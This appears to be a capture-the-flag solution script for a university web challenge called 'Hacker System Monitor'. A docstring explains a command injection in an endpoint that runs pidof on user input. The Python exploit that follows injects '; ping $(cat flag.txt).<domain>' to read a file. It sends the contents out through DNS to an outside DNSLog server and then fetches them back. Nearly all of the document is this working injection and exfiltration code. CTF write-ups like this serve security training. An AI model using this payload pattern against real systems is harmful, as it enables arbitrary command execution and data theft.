"""
# #1 Hacker System Monitor

## Type
Web Security

## Vulnerability type
Command Injection

## Description
We created this fancy system monitor to brag about our powerful servers. We are not executing too many processes, are we?

## Explaination
In this challenge, it appears that the server likely utilizes the `pidof` command followed by user input. 
This setup creates an opportunity for injecting custom shell commands. 
In fact, by appending a semicolon `;` followed by a custom command, an attacker could execute arbitrary shell commands.

To address this challenge, one potential approach is to employ DNSLog services. 
DNSLog services enable the capture of every request made to one of their domains, regardless of any preceding strings in the request URL.
More precisely, an attacker can access the content of flag.txt and append it before the domain. 
Following this, they can utilize the `ping` command to generate a ping request, allowing the DNSLog service to capture and display the request URL containing the flag.
"""

import random
import requests
import urllib.parse

if __name__ == "__main__":

    # dnsbin.zhack.ca (sometimes it is blocked by the firewall)
    dnslog_url = "http://47.244.138.18"

    client = requests.Session()

    # Get a new domain
    response = client.get(url=f"{dnslog_url}/getdomain.php?t={random.random()}")
    domain = response.text

    # Inject the command
    challenge_url = "http://cyberchallenge.disi.unitn.it:50000"

    # Execute the ping to the domain
    # This works because everything that comes before it is associated to the domain
    # In this case, we put the content of flag.txt before the domain
    command = f"; ping $(cat flag.txt).{domain}"
    command = urllib.parse.quote(command)

    client.get(url=f"{challenge_url}/pid/{command}")

    # Get the last record
    response = client.get(url=f"{dnslog_url}/getrecords.php?t={random.random()}")
    records = response.json()

    # Extract the flag
    flag = records[0][0].replace(f".{domain}","")
    print(flag)
